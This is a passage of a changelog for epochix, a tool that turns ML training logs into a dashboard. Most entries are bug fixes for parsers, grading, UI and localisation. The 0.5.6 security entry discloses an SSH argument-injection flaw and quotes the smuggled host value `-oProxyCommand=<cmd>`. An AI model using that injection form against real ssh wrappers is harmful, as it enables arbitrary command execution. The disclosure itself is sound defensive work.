- **`epochix config set EPOCHIX_PORT 8080` wrote `EPOCHIX_EPOCHIX_PORT`** — a
  key nothing reads, reported as success. The prefix is no longer applied
  twice; `port`, `EPOCHIX_PORT`, and `epochix_port` all set the same variable.

### Added

- `AGENTS.md` — the conventions and traps of this repository, for anyone
  changing it.
- `/llms.txt` — a machine-readable summary of what epochix is for and how to
  drive it, including the things people (and coding agents) reliably assume
  and get wrong.

---

## [0.5.32] — 2026-07-27

The last two findings from the cold-start usability report.

### Fixed

- **The architecture panel reported "0 params" for every layer.** A plain
  `print(model)` carries no parameter counts, and the module-repr parser
  hardcoded `0` — so a model with 211,690 parameters was described as having
  none. A module's repr *does* carry the shapes its parameters are built from,
  so the count is now derived exactly for the weight-bearing built-ins:
  `Linear`, `Conv*d`/`ConvTranspose*d` (including `groups=` and `bias=False`),
  `BatchNorm`/`InstanceNorm`/`GroupNorm`/`LayerNorm` (respecting `affine=` and
  its differing defaults), `Embedding`, and `LSTM`/`GRU`/`RNN` (stacked and
  bidirectional). Every expected value in the new tests came from real PyTorch
  `sum(p.numel() ...)`, not from hand arithmetic.
- **A count that cannot be derived now shows nothing instead of "0".** A custom
  block's parameters are genuinely unknown, and `0` is a false claim rather
  than a missing one; a `ReLU`'s `0` is real and stays. Where any layer is
  unknown, the summary chip drops the total rather than quietly understating it.
- **`epochix run --export` gained `--output`/`-o`**, creates the parent
  directory if needed, and prints the absolute path it wrote — it used to drop
  `<run_id>.<fmt>` into the current directory and report a bare relative name.
- **A busy port is now explained instead of traced.** The server starts as a
  background asyncio task, so a collision surfaced as an unhandled `OSError`
  stack trace. `epochix run` and `epochix serve` now check the port first and
  say which one is taken and which to try instead.

---

## [0.5.31] — 2026-07-27

The VS Code extension's two onboarding buttons both failed on a fresh machine.
Same root cause as 0.5.30's report, opposite halves of the same switch.

### Fixed

- **"Try a Demo Run" and "Open Log File" died with a raw
  `connect ECONNREFUSED 127.0.0.1:7860`** and left an empty dashboard whenever
  the Python sidecar was registered but unreachable. The extension ships a
  complete standalone engine, so this never had to fail: the panel now drops
  the dead sidecar, switches to the built-in engine, parses the log locally,
  and says what happened in plain language. Socket error codes are no longer
  shown to users verbatim.
- **"Watch Active Terminal" silently showed nothing for anyone who had the
  Python package installed.** Terminal output reaches the dashboard only
  through the standalone engine, and that path is a no-op when a sidecar owns
  the panel — but the watcher handed its panel the sidecar. The sidecar has no
  terminal-ingest endpoint (it can only parse a file on disk), so the watched
  dashboard now always uses the built-in engine.
- **epochix installed in a virtualenv was reported as "not installed".** The
  launcher only looked for `epochix` and a bare `python` on PATH, which misses
  the overwhelmingly common case of a project venv. It now also tries the
  interpreter selected in the Python extension, `python.defaultInterpreterPath`,
  and `.venv`/`venv`/`env` in each workspace folder. The not-found message now
  says the extension still works without the package, and offers a button
  straight to the `epochix.sidecarPath` setting.

The existing demo test could not have caught any of this: it forces
`useSidecar: "never"`, which is the mode that already worked. Three host tests
now cover the sidecar-present and sidecar-dead paths.

---

## [0.5.30] — 2026-07-27

A cold-start usability test — an outside agent, a fresh machine, no prior
knowledge of epochix — found three places where the dashboard stated something
that was not true. All three are fixed here.

### Fixed

- **"VAL ACCURACY 123.6%"**. A frame built before the task was detected measures
  whatever metric had arrived so far, which on a classification run is usually a
  loss. The dashboard formatted *every* frame with the run's **final** primary
  metric, so a `train_loss` of 1.2364 was rendered as accuracy. Frames now carry
  the metric key they were actually measured from (`StoryFrame.primary_metric`,
  persisted via an additive `story_frames.primary_key` column), and the panels
  format each frame by its own metric. Existing databases are migrated in place;
  frames written before the column existed read back as `None` and fall back to
  the run's metric as before.
- **Fabricated "custom" metric series.** Following our own `epochix check`
  advice to `print(model)` injected `kernel_size`, `in_features`, `stride` and
  friends into the chart as a metric series next to real accuracy. tqdm and
  download bars did the same via `Downloading=100`. Run configuration
  (`batch_size`, `num_workers`, `epochs`, …) was also charted as a flat series.
  All three classes are now filtered; `lr` stays, because a learning-rate
  schedule is a real curve.
- **"Peak form" on a model that was overfitting.** The phase templates are
  driven by how far through training we are, so a run that peaked at epoch 5 and
  declined for five more was still narrated "final refinements bring the model
  to peak form" — contradicting the diagnostics panel on the same page. The
  engine now tracks the best value and its epoch, and says so: "performance has
  slipped from 0.8650 (epoch 5) to 0.8520. That is usually overfitting rather
  than progress." Localised to Persian and French.
- A stalled-run template variant offered no diagnosis, so a random third of runs
  (variant choice is seeded by the run id) got a dead end instead of something
  to check. Every variant is now actionable, and a test enforces it — the same
  randomness was making that test fail intermittently.

---

## [0.5.29] — 2026-07-25

An AI agent asked to demo the library ended up calling `inspect.getsource()` on
our internals to work out what log format we accept — and the dashboard cheered
on a model that had learned nothing. Both are addressed here.

### Added — `epochix check <log>`

Point it at a log and it says what epochix can read and what is missing:
which parser matched, which metrics were found (with their range), the task it
inferred, and the exact `print(...)` line to add for anything absent — a
task-defining metric, epoch numbers, or a model summary for the Network panel.
This is the answer to "the dashboard is empty and I do not know why", for
humans and for agents, neither of whom should have to read our source.

### Fixed — the story no longer claims progress that did not happen

A run pinned at ~11 % accuracy on a 10-class problem (chance is 10 %) was
narrated "Loss curves bend downward. The model is a diligent student." The
narrative is driven by how far through training you are, not by whether the
metric actually moved. When a run has seen a few epochs and realised almost
none of its achievable improvement, it now says so plainly — and points at the
usual causes (learning rate, data pipeline, label mapping) — in all three
locales. Runs that are genuinely improving, including slowly, are unaffected.

### Fixed — a new CLI command was unreachable, and Unicode crashed old consoles

The command router matched against a hardcoded list, so `epochix check` was
parsed as a log-file path ("Got unexpected extra argument"); the list is now
derived from the registered commands. Console output also falls back to ASCII
when the terminal cannot encode `→`/`✓` — a Windows cp1252 console raised
`UnicodeEncodeError` and killed the command mid-print (`epochix list` had the
same latent flaw).

## [0.5.28] — 2026-07-20

### Fixed — a healthy model logging only loss was graded "F"

Reported from a real run: a Fashion-MNIST CNN whose validation loss was falling
nicely (training well) got a scary grade **F**, with the metric shown generically
as "METRIC" and narrated as "reduced its error … earning a grade of F".

The cause: a script that logs only a loss curve (no accuracy) detects as the
`custom` task, and `custom` had no grade thresholds — so `compute_grade` fell
back to the **classification** scale (higher-is-better accuracy) and scored a
`val_loss` of 0.19 as if it were 19 % accuracy → F, contradicting its own
"the trend is positive" narrative.

`custom` metrics have no absolute scale, so they are now graded on **improvement
from baseline** and their direction inferred from the metric name: a loss that
falls a lot earns an A, one that barely moves earns a C, one that *diverges*
still earns an F. Grades for all the named tasks (classification on accuracy,
regression on MAE, etc.) are unchanged. The custom narrative templates also no
longer assume a direction ("and climbing" / "the trend is positive"), so they
read correctly for a decreasing loss.

## [0.5.27] — 2026-07-20

### Changed — discoverability & positioning

Nothing functional; this makes the project easier to find and understand.

- **Animated demo GIF** at the top of the README, the VS Code Marketplace
  listing and the docs home — the real dashboard turning a training log into a
  network view, a letter grade and a plain-English story.
- **Sharper hook** across PyPI, the Marketplace and the docs: *"See what your
  model is doing — training logs become a plain-English story with a letter
  grade."*
- **Social-preview image** (`asset/epochix_social.png`) for link unfurls.
- Wider Marketplace **keywords** (pytorch, tensorflow, keras, lightning,
  huggingface, yolo, mlops, experiment tracking, …).
- Development status promoted **Alpha → Beta**.

## [0.5.26] — 2026-07-16

### Fixed — the dashboard was unusable in a narrow VS Code panel

Reported from a real session: opened in a side-by-side editor group (~300px
wide) the dashboard collapsed — the run title truncated to "E…", the subtitle
wrapped one word per line, and the collapsed sidebar rail ate a fifth of the
width. The narrowest breakpoint was 860px, so a panel that narrow had no rules
at all. Below 560px the nav rail is now hidden and the header stacks, so the
title, phase and grade all fit.

### Fixed — "No architecture to display" was invisible in the light theme

The empty-state message was drawn in hardcoded white, so on the light theme's
white panel a run without a model summary showed a large blank box and no
explanation. It now uses the theme's text colour, and wraps instead of running
off both edges of a narrow panel.

### Changed — the network panel no longer reserves empty space

With no architecture to draw, the canvas held its full height — roughly 800px
of blank box to scroll past before reaching the story. It now collapses to fit
the message.

## [0.5.25] — 2026-07-16

### Fixed — 0.5.24's demo button shipped without its demo

The bundled `demo.log` was silently excluded from the 0.5.24 package by the
repository's `*.log` ignore rule, so **Try a Demo Run** pointed at a missing
file. The asset is now tracked (with an explicit ignore exception), and the
extension host test fails if the demo log is ever missing or empty again —
the dashboard panel opens even without the file, so the previous test passed
vacuously. Install 0.5.25 instead of 0.5.24.

## [0.5.24] — 2026-07-16

### Added — one-click onboarding for non-technical users

Installing only the extension used to show nothing until you produced a
training run yourself. Now:

- **▶ Try a Demo Run** — a new command (and the first button in the Epochix
  sidebar) opens the dashboard on a bundled real Keras run, architecture panel
  and all. No Python, no data, no configuration: install → click → see it.
- **Get Started walkthrough** — a native VS Code walkthrough (appears on the
  Welcome page after install) with four steps: try the demo, watch your own
  training, open a finished log, and — optionally — add the Python engine for
  history/compare/exports.

### Fixed — documentation

- README's Lightning example imported `EpochixCallback`, a class that does not
  exist (it's `StoryCallback`) — copy-pasting it raised ImportError.
- The docs' "full" install suggested `epochix[full]`, an extra that does not
  exist (it's `epochix[all]`).
- README, docs index and quickstart now lead with the zero-setup VS Code path
  and reflect the current feature set (LLM fallback, localised narratives,
  sidebar entry points, run compare).

---

## [0.5.23] — 2026-07-16

### Fixed — story narratives are now fully localised

The narrative templates already had Persian and French variants for every task
except `custom` — the fallback task every unrecognised metric lands in. So a
Persian user with an exotic log got a correctly mirrored RTL dashboard whose
story was narrated in English. The ten missing templates (5 phases × fa/fr) are
now translated, and new tests fail CI if any future template ships without both
translations or drifts its `{placeholders}` from the English original.

---

## [0.5.22] — 2026-07-15

### Added — the LLM fallback is now actually reachable

0.5.18 made the LLM parser extract correctly, but it was orphaned: nothing
registered it, nothing invoked it, its settings didn't connect, and its final
block was never flushed. It is now wired end to end:

- `EPOCHIX_LLM_ENABLED=true` (or `llm_enabled` in config) turns it on; the
  parser reads `llm_provider` / `llm_model` / `llm_key` / `ollama_url` from
  settings, with the `EPOCHIX_LLM_URL` / `EPOCHIX_LLM_KEY` / `EPOCHIX_LLM_MODEL`
  env vars still taking precedence.
- It fires **only at end of stream, and only when the regex parsers extracted
  nothing** — a normal run never touches it, and `--no-llm` disables it per run.
- The blocking LLM calls run in a worker thread, so the event loop — and every
  other live dashboard — stays responsive.
- Extraction is capped at 400 lines (≤ 20 LLM round-trips); it targets short
  exotic logs, not gigabyte transcripts.
- Documented in the quickstart.

### Added — the dashboard render suite also runs on macOS

The `browser` CI job is now an OS matrix: Chromium, Firefox and WebKit render
the dashboard on both `ubuntu-latest` and `macos-latest`. WebKit on a macOS
runner is the closest CI gets to real Safari on a real Mac — closing the last
rendering-verification gap that no machine in this project could reach.

---

## [0.5.21] — 2026-07-15

### Changed — the activity-bar icon is the Epochix "E" mark

The sidebar icon shipped in 0.5.20 was a generic line-chart placeholder; it's
now the Epochix "E" logo (a monochrome trace, since VS Code tints activity-bar
icons with the theme colour).

---

## [0.5.20] — 2026-07-14

### Fixed — there was no visible way to open the dashboard

The only entry points were the `Ctrl+Alt+M` keybinding and the command palette
— both undiscoverable. The status-bar pill *was* wired to open the dashboard,
but it was created hidden and only shown once the dashboard was already
streaming frames, so on a fresh session nothing was clickable at all.

- The status-bar pill now shows from activation (`⚡ Epochix`, click to open) and
  falls back to that idle state when a run ends, instead of vanishing.
- **New Epochix activity-bar icon** (left sidebar) opens a panel with **Open
  Dashboard**, **Watch Active Terminal** and **Open Log File** buttons, plus the
  same actions on the view's title bar. The "Epochix Runs" view moved out of the
  Explorer into this dedicated container.

---

## [0.5.19] — 2026-07-14

### Fixed — "Epochix: Compare Two Runs" was a placeholder

The command showed "Run comparison coming in v0.2." — a shipped no-op for a
feature the Python side has had all along (`epochix compare`, and a full
select-to-compare run list in the dashboard). It now opens the sidecar
dashboard's run list, where you pick runs and hit Compare. In standalone mode
(no sidecar, no stored history) it explains that comparison needs the Python
package rather than silently doing nothing.

---

## [0.5.18] — 2026-07-14

### Fixed — the LLM fallback parser extracted nothing

Pointed at a real Ollama for the first time, the opt-in LLM fallback parser
returned zero metrics. The Ollama call asked for `"format": "json"`, which only
constrains the model to emit *some* valid JSON — so a multi-metric log came back
as a single collapsed object, and `_parse_response` (which accepted only arrays)
dropped it.

It now sends an explicit array **schema** as the format, which reliably yields
one object per metric — verified against real models, extracting all metrics
(with epochs) from a prose log no regex parser can read. `_parse_response` is
also hardened: it strips a markdown ```json fence and accepts a single collapsed
object, both of which real models still emit despite being asked not to.

> Note: the LLM fallback remains **manual opt-in** — it is not auto-registered
> and is not yet wired to the `llm_*` settings. See the tracking issue for
> connecting it end to end.

---

## [0.5.17] — 2026-07-14

### Fixed — the SSH ingester leaked its `ssh` subprocess

Testing the SSH ingester against a real `sshd` (tailing a remote log over an
actual connection) showed the pipeline never closed the ingester's async
generator — it held `ingester.lines().__aiter__()` and just let the reference
drop. So the generator's `finally:` (which terminates the `ssh` subprocess and
the remote `tail -F`) only ran whenever Python next garbage-collected it.

Every interrupted or cancelled remote run therefore orphaned an `ssh` process
and a remote `tail`, and a long-running server that spawned SSH runs leaked one
per run. The pipeline now `aclose()`s the generator deterministically in a
`finally`, settling the shielded in-flight read first so cancellation cleans up
correctly too.

The streaming itself was already correct: verified end to end against real
`sshd` — key auth, `BatchMode`, `accept-new`, `tail -F -n +0` replay, and live
following of an appended file all work.

---

## [0.5.16] — 2026-07-14

Running real ultralytics, fastai and Accelerate through their parsers for the
first time (they had only ever been checked against hand-written fixtures, or
fuzz-tested for crashes). Two more bugs.

### Fixed — fastai dropped the accuracy column, grading classifiers F

fastai's metrics table is `epoch  train_loss  valid_loss  <extras…>  time`. The
header parser took the extra-metric names from columns `2:-1`, but index 2 is
`valid_loss` itself — so every extra header shifted by one. A run's `accuracy`
value was stored under the label `valid_loss` (and its real name lost), so a
classifier looked like a pure-loss run: misclassified as `custom`, graded on
loss, **F**. It now reads `accuracy` correctly and grades the run B+.

### Fixed — `step` became a bogus "custom" metric

Real Accelerate (`accelerator.print({...})`) and many HuggingFace Trainer
configs log a Python dict that includes a `step` key. The HuggingFace parser —
which handles both — popped `epoch` but not `step`, so the step count was
emitted as a meaningless `custom` metric on the dashboard and the step context
was never set. `step` is now carried as context, like `epoch`.

### Added

- Byte-exact real-output fixtures for ultralytics, fastai and Accelerate, with
  correctness tests (previously these parsers had only fuzz/throughput
  coverage, which is why both bugs shipped).

---

## [0.5.15] — 2026-07-14

### Fixed — progress-bar logs recorded every metric twice (or more)

Running real ultralytics YOLO for the first time showed each epoch's losses
stored once per **progress-bar redraw**: `box_loss` appeared 6 times for a
3-epoch run.

Real tqdm/YOLO output redraws the same line with carriage returns —
`\r  1/3  …  0%|…|` then `\r  1/3  …  100%|…|` — all before a single newline.
The pipeline's `_clean_line()` has always known to collapse that to the final
visible state, but it never saw a `\r`: the file ingesters opened logs in
Python's default **universal-newline** mode, which converts a lone `\r` into a
line break. Every redraw arrived as its own line and was parsed as another
epoch row.

Logs are now read with `newline="\n"` so the carriage returns survive to
`_clean_line()`, which collapses them. Affects any framework that draws a
progress bar — tqdm, ultralytics, Keras `verbose=1`.

`_clean_line()` also no longer collapses on a *trailing* `\r`: that is a CRLF
line ending, not a redraw, and splitting on it would have returned the empty
string for every line of a Windows-encoded log.

### Added

- `tests/fixtures/logs/yolo_real_ultralytics.log` — a byte-exact capture of real
  ultralytics 8.4.55 output (carriage returns and all), with `.gitattributes`
  marking the log fixtures `-text` so git cannot normalise away the very thing
  they test.

---

## [0.5.14] — 2026-07-14

Driving the VS Code extension's terminal→dashboard journey end to end for the
first time. **Standalone mode — the path every user takes who installs the
extension without the Python package — was fundamentally broken.** Seven bugs.

### Fixed — standalone runs shorter than 50 lines showed an empty dashboard

`StandaloneEngine` discarded the first 50 lines outright (`if (seq < 50) return
[]`) while "accumulating a sample". They were never buffered, so a run that
finished inside that window rendered nothing at all. Lines are now held and
replayed once the format is known, so nothing is lost.

### Fixed — only the universal parser was ever used

The format sniff ran on an **empty array** (both branches of its ternary
evaluated to `[]`), so every parser scored its floor and the universal fallback
always won. The Keras, Lightning, HuggingFace and YOLO parsers were unreachable
in standalone mode. The sniff now runs on the actual buffered lines.

### Fixed — a log with 3 metrics per line produced no frames, ever

The task was classified on `_allMetrics.length === 10` — an exact match. A log
emitting three metrics per line counts 3, 6, 9, 12 and never *equals* 10, so the
task was never detected and not a single frame was built.

### Fixed — the epochs that triggered detection were dropped

Detection can only fire once it has seen some training output, and everything
buffered up to that point was thrown away — so the dashboard always started
mid-run. Both the terminal feed and the story engine now replay what they held
while deciding.

### Fixed — the feed could die silently mid-run

Training detection was re-tested per chunk against a rolling 8 KB tail, so a
long non-metric burst mid-run could push the last `Epoch N/M` out of the window,
flip the check back to false, and stop feeding the dashboard for the rest of the
run. Detection now latches.

### Fixed — ordinary key=value logs never opened the dashboard

The detector scored `soft * 0.15`, and `3 * 0.15 === 0.4499999999999999` in IEEE
— a hair under its own 0.45 threshold. A log with exactly three soft signals
(`loss=`, `accuracy=`, `val_loss`) silently failed to trigger; it took four.

### Fixed — "Watch Active Terminal" captured nothing

`attachToActive()` never registered the shell-execution listener — only
`attachToActiveAutomatically()` did, and `extension.ts` skips that when
`epochix.autoWatchTerminal` is false. The command announced *"Watching terminal
X"* and then did nothing at all.

### Fixed — the TypeScript parsers had drifted behind Python

The universal parser never received the 0.5.8 bare-`Epoch N/M` header fix (so
the extension showed "Epoch —" and a dead progress bar for any log it handled)
nor the 0.5.12 control-key ordering fix (metrics printed before an `epoch=` key
were attributed to the previous epoch). Both are ported.

---

## [0.5.13] — 2026-07-14

Same exercise as 0.5.12, applied to the three remaining integrations that had
never been executed: the Jupyter magics and the TensorBoard / W&B importers.
Six more bugs.

### Fixed — `%load_ext epochix` registered no magics at all

It printed *"The epochix module is not an IPython extension"* and did nothing,
so `%epochix` and `%%epochix` simply didn't exist. IPython looks for
`load_ipython_extension` on the module you name, and it only lived on
`epochix.integrations.jupyter`. It is now on the top-level package, so the line
the quickstart tells you to run actually works.

### Fixed — `%epochix <log>` showed an empty dashboard

The magic parsed the log into the default `db=":memory:"`, threw the run away,
and then rendered an iframe pointing at a run the server had never heard of. It
now parses into the database the server serves, and names the run after the log.

### Fixed — `%%epochix --live` recorded no real metrics

It pushed a fabricated `raw=0.0` value for every output line and never fed the
script's actual output to the parser, so a live cell produced a run containing
nothing but heartbeats. It now relays each real line through the parser. It also
no longer starts a second server on the port `LiveReporter` is already binding,
which made uvicorn fail to start and killed the reporter thread.

### Fixed — TensorBoard import produced a run with zero frames

`import_tensorboard()` discarded the step, and `EventAccumulator` yields
tag-by-tag (every loss, *then* every accuracy) — so the story engine saw a
scrambled, epoch-less stream and emitted **no frames whatsoever**. Tags are also
mapped properly now: `Loss/train` became the key `loss_train`, which the
normalizer doesn't recognise, so every metric landed as an unusable `custom`.
Scalars are now grouped by step (one epoch each) and tags canonicalize
(`Loss/train` → `train_loss`, `Accuracy/val` → `val_accuracy`). It also returns
`Run` objects, as its docstring always claimed.

### Fixed — W&B import dropped the step

Every `_`-prefixed column was skipped as bookkeeping, but that is exactly where
W&B keeps the step (`_step`) — so imported runs had no epoch at all unless the
user happened to log one. NaN holes in sparse histories are now dropped rather
than coerced.

### Added

- `LiveReporter.log_line(text)` — feed one raw log line, exactly as a training
  script printed it, through the parsers. This is the honest primitive for
  relaying somebody else's stdout (a subprocess, a notebook cell).

---

## [0.5.12] — 2026-07-14

The PyTorch Lightning and HuggingFace integrations — the two examples the
quickstart leads with — had never been run against the real frameworks. Doing
so surfaced four bugs, three of which made the integrations useless.

### Fixed — PyTorch Lightning integration was completely broken

`trainer.fit()` crashed with `AttributeError: 'StoryCallback' object has no
attribute 'setup'` before the first epoch. Lightning resolves every hook with a
bare `getattr(callback, hook_name)`, so a callback that doesn't subclass
`lightning.pytorch.Callback` dies on the first lookup — and the error handler
then crashed again on `state_key`. `StoryCallback` now subclasses Lightning's
`Callback` (resolved lazily, so Lightning stays an optional dependency).

### Fixed — HuggingFace integration silently recorded nothing

The HF `StoryCallback` was rebound to a `TrainerCallback` subclass with the
bases the wrong way round (`class StoryCallback(TrainerCallback, StoryCallback)`),
so `TrainerCallback`'s no-op hooks shadowed every one of ours. Training ran
perfectly, reported no error, and stored **zero** runs. The dashboard just
stayed empty.

### Fixed — a healthy classifier was graded F under HuggingFace

The HF callback defaulted `primary_metric` to `"eval_loss"`, overriding the
metric the task implies. A classifier sitting at 84% accuracy was graded on its
loss and came out **F**. When `primary_metric` is unset the task now decides
(`val_accuracy` for classification), matching the Lightning path.

### Fixed — metrics logged before the epoch key landed on the previous epoch

`reporter.log(train_loss=…, epoch=3)` attributed the loss to epoch **2**, and
the first epoch vanished entirely (stored as `epoch=None`). The universal parser
stamped each metric with the epoch it had seen *so far*, scanning left to right,
so an `epoch=` key appearing after the metrics on a line was applied too late.
Control keys (`epoch`, `step`) now take effect before any metric on the line is
stamped, whatever the order. This affected every SDK caller, not just Lightning.

### Changed

- The Lightning callback no longer logs from `on_validation_epoch_end`:
  `on_train_epoch_end` already sees this epoch's `val_*` metrics, so the extra
  hook duplicated every validation event (and dropped their epoch).
- HuggingFace throughput bookkeeping (`*_runtime`, `*_samples_per_second`,
  `*_steps_per_second`, `total_flos`) is no longer stored as dashboard metrics.
- New CI job runs both callbacks against real Lightning and Transformers.

---

## [0.5.11] — 2026-07-13

### Fixed — network view no longer blanks on narrow / mobile layouts

- **The Network State canvas could render at zero width** (blank) on a narrow
  viewport. Its `ResizeObserver` can fire mid-reflow while the parent momentarily
  reports 0 width; the canvas was then sized to 0 and never recovered. It now
  retries on the next animation frame instead of locking in a zero-width buffer.
- Verified the dashboard at mobile (375px), tablet (768px) and desktop widths:
  no horizontal overflow, no zero-width visible canvases, and high-DPI (2×)
  canvas scaling renders correctly.



### Fixed — dependency floors were too low for Python 3.13; SPA route hardened

Installing the declared minimum dependency versions revealed they don't actually
work on Python 3.13, which we claim to support:

- **`sqlalchemy>=2.0`** — 2.0.0 raises `AssertionError` on Python 3.13 (its
  `TypingOnly` check rejects 3.13's new `__static_attributes__` /
  `__firstlineno__`), fixed upstream in 2.0.31 → floor bumped to **>=2.0.31**.
- **`pydantic>=2.7`** — 2.7's `pydantic-core` has no 3.13 wheel and won't build
  → floor bumped to **>=2.9**.
- **`typer>=0.12`** — 0.12 crashes on 3.13 (`Type not yet supported:
  pathlib._local.Path | None`) → floor bumped to **>=0.15**.
- **SPA catch-all routes**: `FileResponse` was imported inside `create_app`, so
  under `from __future__ import annotations` the `-> FileResponse` return
  annotation couldn't be resolved by older pydantic when FastAPI built the route.
  Moved the import to module scope — robust across pydantic versions.

The full unit + integration suite now passes against the corrected floor set
(pydantic 2.9.2 / sqlalchemy 2.0.31 / typer 0.15.4 / fastapi 0.116 / uvicorn
0.30) on Python 3.13. Normal `pip install` was already fine (pip resolves to
current versions); this only bit anyone pinning the old floors.



### Fixed — localisation actually localises, and Persian renders right-to-left

- **`?locale=fr` / `?locale=fa` barely changed the UI**, and **Persian (fa)
  rendered left-to-right** — the panel titles, nav items and chrome were
  hardcoded English in the markup and nothing set the text direction. The static
  chrome is now driven through the locale dictionaries via `data-i18n`
  attributes, missing keys fall back to English (partial translations degrade
  gracefully), and the document flips to `dir="rtl"` for Persian.
- Added French and Persian translations for the navigation and panel titles, and
  a unit test for the locale/direction application. Verified in the browser:
  `fr` shows "Aperçu / État du réseau" (LTR), `fa` shows "نمای کلی / وضعیت شبکه"
  with the sidebar mirrored to the right and no layout overflow.

Note: the *dynamic* story text (narratives, milestone messages) is still
generated in English by the server — full narrative localisation is a separate
follow-up.



### Fixed — "Epoch N/M: metrics" logs now show the epoch and progress

- **When the epoch is printed on the same line as the metrics** — e.g.
  `Epoch 1/8: train_loss=… val_accuracy=…` (no `epoch=1` key/value form) — the
  universal parser extracted the metrics but not the epoch, so the dashboard
  showed "Epoch —" and a progress bar stuck at 0 %. It now recognises a bare
  `Epoch N` / `Epoch N/M` header, stamps each metric with the epoch, and uses
  `M` as the total so the progress bar advances. Found by installing the
  published wheel into a clean venv and driving it as a brand-new user.



### Fixed — file-tail ingester memory bound

- **`FileTailIngester` accumulated an un-terminated line without bound.** Pointed
  at a file with no newlines — a binary blob, or one enormous single-line JSON —
  the read buffer would grow until the process ran out of memory. It now flushes
  the buffered content as a line once it exceeds 1 MiB, so memory stays bounded
  regardless of the file.

### Audited — no changes needed

Finished the sweep of the remaining ingesters and the extension's terminal
detection: the stdin ingester uses bounded queues; the opt-in LLM-fallback
parser wraps its network calls in try/except, guards `float()` conversions, and
relies on the normalizer to drop any non-finite the model hallucinates; and the
VS Code training detector runs on an 8 KiB tail (≈15 ms worst case), so its
`\\d+/\\d+`-style patterns can't blow up in practice.

---

## [0.5.6] — 2026-07-12

### Security — SSH ingester argument injection

- **The SSH-tail ingester passed the target host straight to `ssh` as a
  positional argument.** A target beginning with `-` — e.g.
  `-oProxyCommand=<cmd>` — would be parsed by `ssh` as an *option*, executing an
  arbitrary local command (classic argument injection / RCE). Targets that start
  with `-` are now rejected in the constructor and in `parse_ssh_target`.
- The remote `tail` command now uses a `--` terminator
  (`tail -F -n +0 -- <path>`) so a log path that begins with `-` is treated as a
  path, not a `tail` flag.

### Audited — no changes needed

Continued the exhaustive pass over the remaining surfaces and confirmed they
hold: the PDF and single-file HTML exporters escape all run-supplied text (run
name, narrative, metric keys) — no HTML/script injection, and they build fine
for empty / single-frame / diverged runs; and the dashboard survives aggressive
interaction (rapid epoch scrubbing, out-of-range slider values, spamming the
3D / gradient / theme toggles, the mixed-metric compare view) with no console
errors.

---

## [0.5.5] — 2026-07-12

### Fixed — a pathologically long log line can't freeze parsing (ReDoS)

- **A single very long log line (a tensor/array dump, base64 blob, …) could hang
  parsing for tens of seconds to over a minute** — catastrophic regex
  backtracking. The metric key/value regexes, the architecture-summary parser,
  and the Keras progress-bar sniff all used unbounded quantifiers that backtrack
  O(n²) on long runs of word or digit characters. Found and fixed in **both** the
  Python package and the VS Code extension's parsers:
  - Metric-key capture bounded to 64 chars (`\\w{1,64}`) — universal, Keras,
    PyTorch-Lightning parsers, both codebases.
  - Keras progress-bar step counts bounded (`\\d{1,10}/\\d{1,10}`).
  - Architecture parser truncates over-long lines before its regexes and bounds
    the model-name capture in the summary pattern.
  - The pipeline caps any line at 64 KiB before regex work as a backstop.
  - A 200k-char line now parses in milliseconds (was 12–60 s). Verified the
    whole fixture corpus still parses identically. Regression tests added.

### Audited — no changes needed

Stress-tested more surfaces and confirmed they hold: the broadcast hub
(per-run isolation, ring-buffer replay on reconnect, queue-full never-drop of
milestones, concurrent multi-run fan-out); the WebSocket reconnect/`last_seq`
replay and compare endpoints (unknown ids, >12 ids, injection, huge/negative
`last_seq`); six concurrent training pipelines sharing one store (correct
isolated frames, duplicate-seq idempotency, foreign-key integrity, a 500-epoch
run); and API hostile inputs (path traversal, bad limits, malformed pushes) all
return proper 4xx, never 500.

---

## [0.5.4] — 2026-07-11

### Fixed — a diverged (NaN/Inf) run no longer breaks the dashboard

- **Non-finite metric values (NaN / ±Inf — a diverged or exploding training run)
  crashed the pipeline and the dashboard.** They can't be stored (SQLite coerces
  NaN to NULL, violating the metric column), and they aren't valid JSON:
  Starlette's `JSONResponse` raised a 500, and the WebSocket/SSE stream emitted
  the literal `NaN`/`Infinity` tokens that a browser's `JSON.parse` rejects — so
  a single bad epoch could take down the whole live view.
- Non-finite values are now **dropped at the normalizer** (the pipeline skips the
  event; loss-spike divergence detection still fires on the finite explosion that
  precedes it). As defence in depth, the WS/SSE serialiser and a new
  `SafeJSONResponse` **null out** any non-finite value, the story frame's raw
  metric value and skill-radar axes serialise non-finite to JSON `null`, and the
  progress/maturity signal is clamped finite.

### Audited — no changes needed

Stress-tested the rest and confirmed it holds: all 27 edge-case fixture logs
(garbage, empty, ANSI colours, scientific notation, interrupted, single-epoch,
mixed frameworks) parse without crashing and emit valid JSON; JSON/HTML export
survives empty, single-epoch and diverged runs; the dashboard renders empty and
single-frame runs without errors; and SDK misuse (finish without logging, double
finish) is a no-op.

---

## [0.5.3] — 2026-07-11

### Fixed — the gradient-flow bars now show real data (honesty audit)

- **The per-layer ∇ gradient-flow bars in the Network State panel were
  fabricated** — drawn as `(1 − val_accuracy) × 0.78^depth`, an invented
  vanishing-gradient curve unrelated to the model, even though real per-layer
  gradient magnitudes are captured (backward hooks, 0.5.0). They now render the
  **real** captured mean `|gradient|` per layer, normalised across layers so the
  bar heights show the model's actual gradient distribution, and are **hidden
  entirely** when no gradients are captured (rather than showing a made-up
  curve). On a real run this exposes the true gradient behaviour — e.g. an
  output-layer gradient ~1000× the early-conv-layer gradients, a real vanishing
  signature the old fixed decay never reflected.
- The backward particle stream is now documented as ambient animation only, not
  a measurement.
- Corrected the English "Maturity" label (the run-advancement signal was
  mislabelled "Confidence"; it is not a prediction-confidence estimate — the
  French/Persian locales were already correct).

The rest of the panel was audited and is honest: node brightness / dead nodes
use real captured activations (with a labelled schematic fallback), edge weights
are explicitly schematic, the skill radar carries a "shape is rhetorical" caveat
and derives from real metrics, and the detection loss curve is the real sum of
box+cls+dfl component losses.

---

## [0.5.2] — 2026-07-11

### Fixed — the first epoch is no longer dropped from the story

- **The task-detection warmup silently dropped the first epoch's story frame**
  for runs that log ≤2 metrics per epoch (e.g. just `train_loss` + `val_loss`).
  The engine needs 3 metric events to auto-detect the task before it emits
  frames, so a primary-metric value logged inside that window never produced a
  frame — the grade-arc chart and stat chip started at epoch 2. (Runs logging
  3+ metrics/epoch were unaffected, and the raw metric events — hence the loss
  curves — were always complete.)
- The engine now **buffers the warmup events and backfills their frames** once
  the task is known, so every logged epoch appears in the story. New
  `StoryEngine.process_all()` returns all frames a single event yields
  (`process()` stays a thin back-compat wrapper).
- Verified with real GPU training across tasks — classification (val_accuracy),
